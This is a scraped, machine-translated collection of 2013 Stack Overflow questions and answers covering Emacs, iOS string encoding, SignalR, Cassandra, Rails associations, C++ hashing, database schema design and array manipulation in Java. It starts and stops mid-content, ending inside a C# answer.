马克有一个帖子来解释它： http: [//mark-story.com/posts/view/using-custom-route-classes-in-cakephp](http://mark-story.com/posts/view/using-custom-route-classes-in-cakephp)

你也可以在这里阅读文档[http://book.cakephp.org/2.0/en/development/routing.html#custom-route-classes](http://book.cakephp.org/2.0/en/development/routing.html#custom-route-classes)

# emacs - 复制区域操作的结果以杀死环

> ID：15750247
> 
> 赞同：2
> 
> 时间：2013-04-01T19:24:56.170
> 
> 标签：emacs

我在 Emacs 中有以下代码删除突出显示区域中的换行符：

```
(defun remove-newlines-in-region ()
  "Removes all newlines in the region."
  (interactive)
  (save-restriction
    (narrow-to-region (point) (mark))
    (goto-char (point-min))
    (while (search-forward "\n" nil t) (replace-match "" nil t)))) 
```

我会扩展此功能以自动将结果**复制**（而不是杀死）到杀死环。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T19:39:22.250

```
(kill-ring-save (point-min) (point-max)) 
```

# android - Netbeans 上 android 开发的标准输出在哪里？

> ID：15750249
> 
> 赞同：0
> 
> 时间：2013-04-01T19:25:03.457
> 
> 标签：android, netbeans, output

我正在 netbeans 上开发一个 android 应用程序。例如，如果我要添加 System.out.println("Hello World") 附加到按钮单击，它不会在任何地方输出。我错过了一些基本的东西吗？

这也意味着我永远看不到是否抛出了异常或任何东西。如果我的应用程序有效，它就有效，否则我正在开发“盲目”。帮助？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:26:01.960

在 Android 上，所有这些都转到设备上的 logcat。不知道你如何看待netbeans，但你需要以某种方式将它连接到adb logcat。

# iphone - 整数到指针的转换不兼容？什么？

> ID：15750251
> 
> 赞同：0
> 
> 时间：2013-04-01T19:25:11.233
> 
> 标签：iphone, ios, ipad

我正在阅读一个用 UTF8 编码的 txt 文件。

我现在正在阅读文件。我有这行：

```
- (NSString *) readFromFile {

    NSArray *paths = NSSearchPathForDirectoriesInDomains
    (NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];

    NSString *fileName = [NSString stringWithFormat:@"%@/textfile.txt",
                          documentsDirectory];
    return [[NSString alloc] initWithContentsOfFile:fileName
                        usedEncoding:NSUTF8StringEncoding
                        error:nil];
} 
```

我在最后一行有这个错误：

**不兼容的整数到指针转换将 int 发送到 NSUTF8StringEncoding 类型的参数 ***

为什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-01T19:28:35.583

这里的关键是“使用**d**编码”中的“d”。

*该参数用于将有关用于*读取文件的编码的信息传递回调用者。

这意味着它是`NSString`通知调用者它用于从文件中的原始数据创建对象的编码的类 - 而*不是*可以指示类使用哪种编码的调用者。

要获取此信息，您需要声明一个变量并传递对它的引用，以便`NSString`类对象可以将信息放入其中，以便您稍后在需要信息时阅读。

```
NSStringEncoding enc;

NSString *result = [[NSString alloc] initWithContentsOfFile:fileName
                    usedEncoding: &enc
                    error:nil];

// Do something with the information about the encoding used
if ( enc == NSUTF8StringEncoding ) {
     // ...
}

return result; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:29:28.920

采用：
`initWithContentsOfFile:encoding:error:`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-01T19:31:29.203

```
initWithContentsOfFile:usedEncoding:error:
Returns an NSString object initialized by reading data from the file at a given path and returns by reference the encoding used to interpret the characters.

- (id)initWithContentsOfFile:(NSString *)path usedEncoding:(NSStringEncoding *)enc error:(NSError **)error
Parameters
path
A path to a file.
enc
Upon return, if the file is read successfully, contains the encoding used to interpret the file at path.
error
If an error occurs, upon returns contains an NSError object that describes the problem. If you are not interested in possible errors, pass in NULL. 
```

这是来自文档:-)

所以基本上，就像@Monolo 所说的那样，这是用来向您返回编码类型而不是设置它。如果你想设置它，你必须使用： `- (id)initWithContentsOfFile:(NSString *)path encoding:(NSStringEncoding)enc error:(NSError **)error`

# php - 在 MYSQL 数据库中随机化 x 到 y 行

> ID：15750252
> 
> 赞同：0
> 
> 时间：2013-04-01T19:25:12.830
> 
> 标签：php, mysql, random, mysqli

例如，如何将第 10 行到第 20 行随机化？我只知道如何使用 RANDR() 随机化所有行。我正在使用 PHP + MYSQLi。有人可以解释我使用 MYSQL`RANDR()`吗？我知道它没有效率。

谢谢，汤姆。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:27:57.660

我使用了一种可能移植到 MYSQL 的 SQL Server 技术。我为每一行分配一个新的 GUID，然后对其进行排序。

# signalr - 来自控制器的 SignalR 广播不起作用

> ID：15750253
> 
> 赞同：0
> 
> 时间：2013-04-01T19:25:12.783
> 
> 标签：signalr, signalr-hub

我正在使用最新版本的 SignalR (1.0.1)。我正在尝试从我的控制器广播到集线器并遇到一些问题：

1.  我的客户似乎没有收到消息。
2.  似乎我的集线器上下文甚至没有定义“addMessage”：

我的枢纽：

```
public class SignalRPriceHub : Hub
{
    public void sndMessage(string msg)
    {
        Clients.All.addMessage(msg + "****");
    }
} 
```

Javascript客户端：

```
<script src="@Url.Content("~/Scripts/jquery.signalR-1.0.1.min.js")"></script>
<script src="~/signalr/hubs"></script>
.....
var myHub = $.connection.signalRPriceHub;
myHub.client.addMessage = function (message) {
    alert(message);
}; 
```

控制器：

```
var context = GlobalHost.ConnectionManager.GetHubContext<SignalRPriceHub>();
context.Clients.All.addMessage("TestOutsideMessage!!!"); 
```

我注意到的几件事： 1\. 我的集线器上下文似乎没有 'addMessage' {"'Microsoft.AspNet.SignalR.Hubs.ClientProxy' 不包含 'addMessage' 的定义"} System.Exception {Microsoft .CSharp.RuntimeBinder.RuntimeBinderException}

1.  如果我从与上面的客户端代码相同的文件中运行以下代码，我会收到一条消息。

    var myHub = $.connection.signalRPriceHub; $.connection.hub.start(function () { myHub.server.sndMessage("Hello World!"); });

任何人都可以阐明可能发生的事情吗？谢谢大家！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:40:00.973

我将讨论您最初应用程序中的错误，这些错误阐明了为什么您的第二个要点使一切正常。

在您的 javascript 客户端中，您必须启动连接：

```
$.connection.hub.start(); 
```

然后，您必须通过调用 sndMessage 命令在集线器上请求消息：

```
$.connection.hub.start().done(function() {
    myHub.server.sndMessage("Hello world");
}); 
```

在集线器上下文中看不到 addMessage 函数的原因是集线器上下文 .Clients.All 是动态的。

最后一点，为了使示例工作，您还需要确保在 Application_Start 中有 RouteTable.Routes.MapHubs(); . 我假设你已经有了这个，因为一旦你添加了连接开始一切正常。

# c# - Telerik RadTreeview 使用代码选择一个项目

> ID：15750254
> 
> 赞同：0
> 
> 时间：2013-04-01T19:25:14.017
> 
> 标签：c#, silverlight, radtreeview

我们在我们的应用程序中使用 Telerik RadTreeview。我们在代码中使用了 MVVM 模式。

长话短说，我需要在树视图中选择一个特定项目，展开它，然后将该项目滚动到我的视图中。我在我的视图模型中设置了 SelectedReportRoot。

我按照下面链接中显示的示例创建了我自己的扩展 radtreeview。

[http://sladapter.blogspot.com/2010/11/how-to-bind-to-silverlight-treeview.html](http://sladapter.blogspot.com/2010/11/how-to-bind-to-silverlight-treeview.html)

我的问题是性能。这不好。我做了调试，发现找到一个项目需要很多时间，事实上我的 IE 挂了。谁能告诉我如何解决这个问题，或者向我指出一些有用的资源。

```
 public class SelectableRadTreeViewExtended : RadTreeView
  {

    public SelectableRadTreeViewExtended()
      : base()
    {
      this.SelectionChanged += SelectableRadTreeViewExtended_SelectionChanged;
    }

    void SelectableRadTreeViewExtended_SelectionChanged(object sender, Telerik.Windows.Controls.SelectionChangedEventArgs e)
    {
      this.SelectedItem = e.AddedItems[0];
      if (SelectedItem != null)
      {

        this.CustomSelectedItem = this.SelectedItem;
      }
    }

    public object CustomSelectedItem
    {
      get { return (object)GetValue(CustomSelectedItemProperty); }
      set { SetValue(CustomSelectedItemProperty, value); }
    }
    public static readonly DependencyProperty CustomSelectedItemProperty = DependencyProperty.Register("CustomSelectedItem", typeof(object), typeof(SelectableRadTreeViewExtended), new PropertyMetadata(OnCustomSelectionItemChanged));

    private static void OnCustomSelectionItemChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
    {
      var obj = d as SelectableRadTreeViewExtended;
      if (e.NewValue != null)
      {
        RadTreeViewItem tvi = obj.FindItemNode(e.NewValue);
        if (tvi != null)
        {
          tvi.IsSelected = true;
          obj.GetScrollHost().ScrollIntoView(tvi);
          obj.UpdateLayout();
        }
      }
    }

    public RadTreeViewItem FindItemNode(object item)
    {
      RadTreeViewItem node = null;
      foreach (object data in this.Items)
      {
        node = this.ItemContainerGenerator.ContainerFromItem(data) as RadTreeViewItem;
        if (node != null)
        {
          if (data == item)
            break;
          node = FindItemNodeInChildren(node, item);
          if (node != null)
            break;
        }
      }
      return node;
    }

    protected RadTreeViewItem FindItemNodeInChildren(RadTreeViewItem parent, object item)
    {
      RadTreeViewItem node = null;
      bool isExpanded = parent.IsExpanded;
      if (!isExpanded) //Can't find child container unless the parent node is Expanded once
      {
        parent.IsExpanded = true;
        parent.UpdateLayout();
      }
      foreach (object data in parent.Items)
      {
        node = parent.ItemContainerGenerator.ContainerFromItem(data) as RadTreeViewItem;
        if (data == item && node != null)
          break;
        node = FindItemNodeInChildren(node, item);
        if (node != null)
          break;
      }
      if (node == null && parent.IsExpanded != isExpanded)
        parent.IsExpanded = isExpanded;
      if (node != null)
        parent.IsExpanded = true;
      return node;
    }
  }

<my:SelectableRadTreeViewExtended ItemsSource="{Binding ReportRoots}"
                             SelectionMode="Single"                                 
                             IsEditable="False"
                             Grid.Row="1"
                             HorizontalAlignment="Stretch"
                             VerticalAlignment="Stretch"
                             x:Name="rtvReportRoots"
                             CustomSelectedItem="{Binding SelectedReportRoot, Mode=TwoWay}">
            <my:SelectableRadTreeViewExtended.ItemTemplate>
                <telerik:HierarchicalDataTemplate ItemsSource="{Binding Children}"
                                                  DataType="ViewModels:ReportRootEntityViewModel">
                    <Grid x:Name="NodeContainer"
                          Background="#01000000">
                        <TextBlock Text="{Binding Path=Name}"
                                   Foreground="Gray"
                                   controls:DropZoneHelper.DropZone="NotApplicable" />
                    </Grid>
                </telerik:HierarchicalDataTemplate>

            </my:SelectableRadTreeViewExtended.ItemTemplate>
        </my:SelectableRadTreeViewExtended> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T23:43:08.553

我能够解决我的问题。请看下面我做了什么。总是欢迎评论和建议来改进我的代码。

在我的 UI 中，我在 UserControl.Resources 下添加了这个

```
<telerik:ContainerBindingCollection x:Key="BindingCollection">
                <telerik:ContainerBinding PropertyName="IsSelected"
                                          Binding="{Binding IsSelected,Mode=TwoWay}" />
                <telerik:ContainerBinding PropertyName="IsExpanded"
                                          Binding="{Binding IsExpanded, Mode=TwoWay}" />
            </telerik:ContainerBindingCollection> 
```

我在下面添加

```
<telerik:RadTreeView.ItemTemplate>
                <telerik:HierarchicalDataTemplate ItemsSource="{Binding Children}"
                                                  DataType="ViewModels:ReportRootEntityViewModel"
                                                  telerik:ContainerBinding.ContainerBindings="{StaticResource BindingCollection}"> 
```

我的 ItemsSource 是 ReportRootEntityViewModel 的集合。在此，我添加了三个新属性。

一个是 ReportRootEntityViewModel 类型的父级。

两个布尔属性 IsSelected 和 IsExpanded

现在只需获取正确的元素并设置如下属性即可

```
ReportRootEntityViewModel result = GetReportRootNode(Convert.ToInt32(data[0]), reportRoot.Children);
            if (result != null)
            {
              if (_previousSelectedReportRoots != null)
              {
                _previousSelectedReportRoots.Parent.Parent.IsExpanded = false;
                _previousSelectedReportRoots.Parent.IsExpanded = false;
                _previousSelectedReportRoots.IsExpanded = false;

                _previousSelectedReportRoots.IsSelected = false;
              }

              result.Parent.Parent.IsExpanded = true;
              result.Parent.IsExpanded = true;
              result.IsExpanded = true;

              result.IsSelected = true;              
              SelectedReportRoot = result;

              SelectedReportRootDisplayName = data[1];
             DisplayLabel = "Display Name :";
              _previousSelectedReportRoots = SelectedReportRoot;
              return;
            } 
```

# cassandra - 如何使用 cqlsh 将模式文件加载到 Cassandra

> ID：15750264
> 
> 赞同：5
> 
> 时间：2013-04-01T19:25:46.473
> 
> 标签：cassandra, cql

我有一个 Cassandra 的架构文件。我正在使用 Windows 7 机器（这个机器上的 Cassandra 也是 - 1 个节点）。我想用 cqssh 加载模式。到目前为止，我还没有找到方法。我希望能够将文件传递给 cqlsh: `cqlsh mySchemaFile`。但是，由于我在 Windows 中运行，要启动 cqlsh，我执行以下操作

```
python "C:\Program Files (x86)\DataStax Community\apache-cassandra\bin\cqlsh" localhost 9160 
```

即使我的路径中有 csqsh，当从 python 中这样调用时，它也需要完整路径。

我试图在那里添加文件名，但到目前为止没有运气。这甚至可能吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T23:39:01.110

`-f`cqlsh 通过or选项获取要执行的文件`--file`，而不是作为位置参数（如主机和端口），因此正确的形式是：

```
python "C:\Program Files (x86)\DataStax Community\apache-cassandra\bin\cqlsh" localhost 9160 -f mySchemaFile 
```

注意：我不能 100% 确定您是使用Windows`-f`还是`\f`在 Windows 中。

# ruby-on-rails - Rails has_many :throughdependent :destroy 表现得很奇怪

> ID：15750265
> 
> 赞同：1
> 
> 时间：2013-04-01T19:25:55.603
> 
> 标签：ruby-on-rails, has-many-through

用户：

```
class User < ActiveRecord::Base

  attr_accessible :email, :username, :password, :password_confirmation, :remember_me

  has_many :tasks_users, :dependent => :destroy, :conditions => {:is_owner => true}
  has_many :tasks, :through => :tasks_users, :source => :task 
```

任务：

```
class Task < ActiveRecord::Base
  include RankedModel
  ranks :sort_order

  acts_as_taggable

  has_many :tasks_users  
  has_many :users, :through => :tasks_users 
```

任务用户：

```
class TasksUser < ActiveRecord::Base
    attr_accessible :is_owner
    belongs_to :user
    belongs_to :task

    validates_uniqueness_of :user_id, :scope => [:user_id, :task_id]
end 
```

他们这里的关键是依赖破坏。

每当我尝试销毁我的用户时，这应该会破坏连接模型，我最终会收到这个奇怪的 sql 错误：

```
User Load (0.1ms)  SELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT 1  [["id", 17]]
   (0.1ms)  begin transaction
  ActsAsTaggableOn::Tagging Load (0.1ms)  SELECT "taggings".* FROM "taggings" WHERE "taggings"."tagger_id" = 17 AND "taggings"."tagger_type" = 'User'
  TasksUser Load (0.1ms)  SELECT "tasks_users".* FROM "tasks_users" WHERE "tasks_users"."user_id" = 17 AND "tasks_users"."is_owner" = 't'
Could not log "sql.active_record" event. NoMethodError: undefined method `name' for nil:NilClass
**SQLite3::SQLException: no such column: tasks_users.: DELETE FROM "tasks_users" WHERE "tasks_users"."" = ?**
   (0.1ms)  rollback transaction
ActiveRecord::StatementInvalid: SQLite3::SQLException: no such column: tasks_users.: DELETE FROM "tasks_users" WHERE "tasks_users"."" = ?
from /home/steveq/.rvm/gems/ruby-1.9.3-p194@rails32/gems/sqlite3-1.3.7/lib/sqlite3/database.rb:91:in `initialize' 
```

带有双星号的行是有问题的行 - 它似乎正在搜索“tasks_users”中的记录。“”。

如果我所做的只是更改：conditions => {:is_owner => false}，则 sql 将毫无问题地执行：

```
 User Load (0.2ms)  SELECT "users".* FROM "users" WHERE "users"."id" = ? LIMIT 1  [["id", 17]]
   (0.1ms)  begin transaction
  ActsAsTaggableOn::Tagging Load (0.2ms)  SELECT "taggings".* FROM "taggings" WHERE "taggings"."tagger_id" = 17 AND "taggings"."tagger_type" = 'User'
  TasksUser Load (0.1ms)  SELECT "tasks_users".* FROM "tasks_users" WHERE "tasks_users"."user_id" = 17 AND "tasks_users"."is_owner" = 'f'
  List Load (0.2ms)  SELECT "lists".* FROM "lists" WHERE "lists"."owner_id" = 17
  Relationship Load (0.1ms)  SELECT "relationships".* FROM "relationships" WHERE "relationships"."user_id" = 17
  SQL (0.3ms)  DELETE FROM "users" WHERE "users"."id" = ?  [["id", 17]]
   (299.4ms)  commit transaction 
```

关于这里发生了什么的任何想法，以及为什么将 is_owner 的条件从 true 更改为 false 允许执行查询和删除语句？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:32:00.270

呃 - 希望我能拯救其他人一个小时免于用头撞墙。

问题是我如何指定：条件。

它需要放在双引号中：

```
 has_many :tasks_users, :dependent => :destroy, :conditions => "is_owner = 'true'" 
```

就是这样。

# c++ - 为成员结构专门化 std 模板

> ID：15750274
> 
> 赞同：1
> 
> 时间：2013-04-01T19:26:39.610
> 
> 标签：c++, c++11, std

我想要一个具有以下结构的类：

```
class A {
public:
  struct key_type {};

private:

  std::unordered_map<key_type, some_other_type> m;

} 
```

据我了解，要完成这项工作，我需要专门化`std::hash`，并且声明了`std::equal_to`之前`A::m`但`A::key_type`声明了之后，这使得它不可能，因为我无法将模板专门*化为* `A`. Afaik，也没有办法转发声明（在`A`定义之外）`A::key_type`。

本质上我的问题是：我是否遗漏了什么，或者这种结构是不可能的？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:38:55.770

有几种方法可以解决这种情况。

1.  定义一个单独的类型。

    ```
    struct A_key_type {};
    namespace std {
        template <> struct hash<A_key_type> { size_t operator()(const A_key_type&); };
    }

    class A {
        typedef A_key_type key_type;
        std::unordered_map<key_type, int> m;
    }; 
    ```

2.  提供明确的自定义哈希类型。

    ```
    class A {
        struct key_type {};
        struct key_type_hasher { size_t operator()(const key_type&); };
        std::unordered_map<key_type, int, key_type_hasher> m;
    }; 
    ```

# .net - 当我在控制台中选择某个区域时，我的 UI 挂起

> ID：15750276
> 
> 赞同：1
> 
> 时间：2013-04-01T19:26:49.870
> 
> 标签：.net, console, c++-cli

我将消息记录到控制台。但我有一些有趣的效果。当我在控制台中选择一些消息时，我的 UI 挂起。当我在控制台中取消全选时，UI 会活着。我不喜欢这样的行为。

有什么解决办法吗？

```
Console::WriteLine("Message"); 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T20:38:18.727

您可以在控制台中以编程方式禁用快速编辑模式：

```
class Program {
    static void Main(string[] args) {
        uint mode;
        IntPtr stdIn = GetStdHandle(STD_INPUT_HANDLE);
        if (GetConsoleMode(stdIn, out mode)) {
            if ((mode & (uint) ConsoleModes.ENABLE_QUICK_EDIT_MODE) != 0) {
                mode = mode ^ (uint) ConsoleModes.ENABLE_QUICK_EDIT_MODE;
                SetConsoleMode(stdIn, mode);
            }
        }
        int i = 0;
        while (true) {
            Thread.Sleep(300);
            Console.WriteLine(i++);
        }
    }
    const int STD_INPUT_HANDLE = -10;
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetStdHandle(int nStdHandle);
    [DllImport("kernel32.dll")]
    static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [Flags()]
    enum ConsoleModes : uint {
        ENABLE_PROCESSED_INPUT = 0x1,
        ENABLE_LINE_INPUT = 0x2,
        ENABLE_ECHO_INPUT = 0x4,
        ENABLE_WINDOW_INPUT = 0x8,
        ENABLE_MOUSE_INPUT = 0x10,
        ENABLE_INSERT_MODE = 0x20,
        ENABLE_QUICK_EDIT_MODE = 0x40,
        ENABLE_EXTENDED_FLAGS = 0x80,
        ENABLE_AUTO_POSITION = 0x100,
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:04:28.707

您正在控制台中选择文本。您可以想象，如果控制台继续输出信息，则很难选择您要选择的内容，因此系统会暂停可见更新。如果您希望您的应用程序继续显示可见更新，请停止选择屏幕上的文本。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-01T20:05:19.523

这并不特定于您的应用程序，它的“功能”适用于所有控制台应用程序。选择文本时 - 整个应用程序挂起。此行为无法更改。

# database - 构建多语言字典数据库的表

> ID：15750285
> 
> 赞同：2
> 
> 时间：2013-04-01T19:27:22.030
> 
> 标签：database, database-design, normalization

我想为多语言词典（英语 - 马拉地语）的数据库构建表。[马拉地语](http://en.wikipedia.org/wiki/Marathi_language)是印度的一种地方语言。
字典的格式是：

> 词 | 英语含义1 | marathi_meaning1 | 英语含义2 | marathi_meaning2 **...** english_meaningN | marathi_meaningN

单词可以具有可变数量的英语和马拉地语含义，具体取决于它是否属于任何词汇类别（名词、副词、动词、形容词等）。
目前我想到了一种低效的方法来创建这样的表格：

**表格**： 单词

*   **word_id**
*   单词
*   英语含义1
*   marathi_meaning1
*   English_meaning2
*   marathi_meaning2
*   English_meaning3
*   marathi_meaning3
*   English_meaning4
*   marathi_meaning4 **。
    .
    .
    .**
*   English_meaning10
*   marathi_meaning10

在这里，我假设英语单词的英语和马拉地语含义有固定数量的列（20）。因此，如果一个词只有一个含义（英语和马拉地语），其余列将保持为空。

此外，如果它是一个单词，例如：'about'，在字典中显示为：

> about1 -含义
> about2 - 含义

然后我将它们维护为上述结构化表中的单独行。
这种方法是不是有问题？这可以通过规范化来解决吗？我已经想到了表格的一种方式：
表格：**单词**

*   **word_id**
*   单词

表：**word_english**

*   **ID**
*   word_id（来自单词表的 FK）
*   English_meaning

表：**word_marathi**

*   **ID**
*   word_id
*   马拉地语意思

我不太确定上述方法是否有意义。任何人都可以提出一个可能的解决方案吗？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T23:13:54.277

哎呀。绝对正常化

```
word
---------
word_id
word
definition
language_id
lexical_part_id

language
-----------
language_id
name

word_word
------------
word1_id
word2_id

lexical_part
-------------
lexical_part_id
name 
```

然后用等价图填写word_word表

# javascript - 使用下拉列表中的值填充 var

> ID：15750286
> 
> 赞同：0
> 
> 时间：2013-04-01T19:27:33.263
> 
> 标签：javascript

目前我有一个脚本，当用户从具有相同类的 4 个不同下拉列表中选择一个项目时，它会用这些值填充一个输入字段。

```
$('.neigh').on('change',function() {

            selectedItems = new Array();
            //console.log(selectedItems);
            $(".neigh option[value]:selected").each(function() {
                if($.inArray($(this).val(), selectedItems) != 0){
                  selectedItems.push($(this).val());
                }
            });
            //console.log(selectedItems);
                var data = selectedItems.join(',');
            $(".hood").val(data);
        }); 
```

我想修改它，而不是用'，'附加值来完全清空数组并添加新值。我将如何对当前脚本执行此操作？

编辑：

因此，结果将是用户选择选项 1，然后选择选项 2。选项 2 仅在数据内。

编辑2：

有 4 个带有多个选项的下拉菜单。每个下拉列表都由同一个类链接到该函数。以前它将每个选项附加到一个输入框。因此，如果用户选择了多个选项，隐藏的输入框将包含“24、24、6、7”等。而不是这个，我宁愿只是最近的选择。因此，如果用户选择 24，隐藏输入中的值将是 24，但如果他们在不同的下拉列表中选择另一个选项，它现在将包含新值。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:30:08.833

```
$('.neigh').on('change',function() {
            $(".neigh option[value]:selected").each(function() {
                $(".hood").val($(this).val());
            });          
        }); 
```

# scala - sbt 版本和 scala 版本。带有 sbt-idea 插件的 intellij idea 的项目配置

> ID：15750287
> 
> 赞同：0
> 
> 时间：2013-04-01T19:27:37.137
> 
> 标签：scala, intellij-idea, sbt, sbt-idea

我按照[这些](https://stackoverflow.com/questions/7039271/beginners-guide-to-sbt-0-10-and-idea)步骤为 IntelliJ idea 配置项目。

```
addSbtPlugin("com.github.mpeltonen" % "sbt-idea" % "1.2.0") 
```

我将[sbt-idea](https://github.com/mpeltonen/sbt-idea)用于 sbt 版本 0.12，并修复[了](https://github.com/mpeltonen/sbt-idea/commit/16398d9fc44ce892a652cb3c55f437fb5d0be3c0)Idea 的错误。

当我输入`sbt`我的项目目录时，我注意到它使用 scala 2.9.2.. 但我将在我的项目中使用 scala 2.10.1。

问题：

将哪个 scala 版本用于插件（`~/.sbt/plugins`）-编译是否有意义，或者我应该对所有内容使用一个/相同的 scala 版本？我可以更改插件的 scala 版本吗？

因此，我创建了`~/.sbt/plugin/build.sbt`包含上述内容的文件。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-04T16:13:48.367

该版本已过时，它取决于 sbt-idea 1.2.0-SNAPSHOT。撰写本文时的最新版本是 1.3.0

请参阅我的项目[框架](https://github.com/fractal/skeleton)，了解使用最新版本的 scala、scalatest 和 SBT 到 IDE 项目插件的实现。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T22:59:04.323

其实我明白了。

1.  如果您有一个带有`build.sbt`（使用 2.10.1 scala）文件的项目 - 只要您键入`sbt`.. 所有依赖项都将下载到`~/.sbt`文件夹中 - 甚至 scala 编译器也会下载到那里（`~/.sbt/boot`）。它甚至可以是 scala 的多个版本：例如 2.10.1 和 2.9.2。

2.  关于 sbt-idea 和`~/sbt/plugins`.. 它可以是任何 scala 版本 - 取决于它的`build.sbt`文件，例如在我的例子中：

> 解析器 += “Sonatype 快照”，位于“ [http://oss.sonatype.org/content/repositories/snapshots/](http://oss.sonatype.org/content/repositories/snapshots/) ”
> 
> ```
> addSbtPlugin("com.github.mpeltonen" % "sbt-idea" % "1.2.0-SNAPSHOT") 
> ```

我应该注意到如果尝试不同的版本..像[1.1.0-M2-TYPESAFE](http://repo.typesafe.com/typesafe/ivy-releases/com.github.mpeltonen/sbt-idea/scala_2.9.2/sbt_0.12/1.1.0-M2-TYPESAFE/)它不会工作..（至少在我的情况下） -`gen-idea`命令不可用。我不知道为什么。我想应该是的。

另外，如果您不指出`resolvers +=`-它将不起作用..但它不会告诉您..

这个插件使用的是 scala 2.9.2 - 我们在这里看不到它，但我们可以从它在安装/下载时产生的输出中看到它。这就是为什么我们有`~/.sbt/boot/scala-2.9.2/`结果。

**无论如何，我们不应该关心它。它由 sbt 处理。**

当您通过输入 sbt 控制台将 sbt-project 转换为 intellij-idea 项目`gen-idea`时，结果您的 IDE 项目将引用`~/.sbt/scala`而不是您的某个地方安装的 scala .. 所以甚至不需要指向 scala 位置 - [sbt-idea](https://github.com/mpeltonen/sbt-idea) sbt的插件将完成所有工作。这很好！

这就是我想要得到的答案。一个人通过尝试得到/理解它。

# java - 将 0 移动到数组末尾

> ID：15750288
> 
> 赞同：8
> 
> 时间：2013-04-01T19:27:36.793
> 
> 标签：java, arrays

我需要将数组中的所有 0 移动到数组的末尾。

示例：[1, 10, 0, 5, 7] 应该导致 [1, 10, 5, 7, 0]。

我愿意做一个反向循环或一个常规循环。

我**无法**创建新数组。

这是我到目前为止所拥有的：

```
for (int i = arr.length; i <= 0; --i) {
    if (arr[i] != 0) {
        arr[i] = arr.length - 1;
    }
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-04-01T19:34:39.890

### SIZE(n) 其中 n = arr.size，保留排序：

创建一个与需要从中删除 0 的初始数组大小相同的数组。遍历原始数组并将每个元素添加到新数组中，前提是它不为 0。当遇到 0 时，计算它。现在，当您到达第一个数组的末尾时，只需将计数的 0 数添加到数组的末尾即可。而且，更简单的是，由于 Java 将数组初始化为 0，因此您可以忘记在末尾添加零。

* * *

**编辑**

由于您添加了无法创建新数组的附加约束，因此我们需要采用与我上面建议的方法稍有不同的方法。

### 尺寸(1)

我假设数组需要保持与将 0 移到末尾之前的顺序相同。如果不是这种情况，还有另一个简单的解决方案，如 Brads 回答中所述：初始化数组的最后一个元素的“最后一个零”索引，然后向后迭代将任何零与最后一个零的索引交换，每次递减您执行交换或看到零。

### SIZE(1)，保留排序：

要在不复制数组并将元素保持正确顺序的情况下将 0 移动到末尾，您可以完全按照我的建议进行操作，而无需复制数组但在同一数组上保留两个索引。

从数组上的两个索引开始。如果元素不为零，则不要将元素复制到新数组中，而是将其保留在原处并递增两个索引。当您达到零时，仅增加一个索引。现在，如果两个索引不相同，并且您不是在查看 0，则将当前元素交换为落后的索引的位置（由于遇到 0）。在这两种情况下，如果当前元素不为 0，则增加另一个索引。

它看起来像这样：

```
int max = arr.length;
for (int i = 0, int j = 0; j < max; j++) {
  if (arr[j] != 0) {
    if (i < j) {
      swap(arr, i, j);
    }
    i++
  }
} 
```

运行这个：

```
{ 1, 2, 0, 0, 0, 3, 4, 0, 5, 0 } 
```

产量：

```
{ 1, 2, 3, 4, 5, 0, 0, 0, 0, 0 } 
```

我为任何好奇的人制作了一个[完整的版本。](http://codepad.org/rnADiIZg)

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-04-01T19:37:29.453

想到两个选择

1.  创建一个相同大小的新数组，然后迭代当前数组并仅用值填充新数组。然后用“零”填充新数组中的剩余条目

2.  在不创建新数组的情况下，您可以向后迭代当前数组，并在遇到“零”时将其与数组的最后一个元素交换。您需要记录交换的“零”元素的数量，以便在第二次交换时与`last-1` 元素交换，依此类推。

* * *

**[编辑]**最初发布以解决评论中留下的“排序”问题和“最后一个元素为零”问题 7 年后

```
public class MyClass {

    public static void main(String[] args) {

        int[] elements = new int[] {1,0,2,0,3,0};

        int lastIndex = elements.length-1;

        // loop backwards looking for zeroes
        for(int i = lastIndex; i >=0; i--) {
            if(elements[i] == 0) {
                // found a zero, so loop forwards from here
                for(int j = i; j < lastIndex; j++) {
                    if(elements[j+1] == 0 || j == lastIndex) {
                        // either at the end of the array, or we've run into another zero near the end
                        break;
                    }
                    else {
                        // bubble up the zero we found one element at a time to push it to the end
                        int temp = elements[j+1];
                        elements[j+1] = elements[j];
                        elements[j] = temp;
                    }
                }
            }
        }

        System.out.println(Arrays.toString(elements));
    }
} 
```

给你...

```
[1, 2, 3, 0, 0, 0] 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2015-06-11T13:34:10.567

基本解决方案是建立一个归纳假设，即子阵列可以保持求解。然后将子数组扩展一个元素并保持假设。在这种情况下，有两个分支 - 如果下一个元素为零，则什么也不做。如果下一个元素不为零，则将其与行中的第一个零交换。

无论如何，优化这个想法后的解决方案（尽管在 C# 中）如下所示：

```
void MoveZeros(int[] a)
{

    int i = 0;

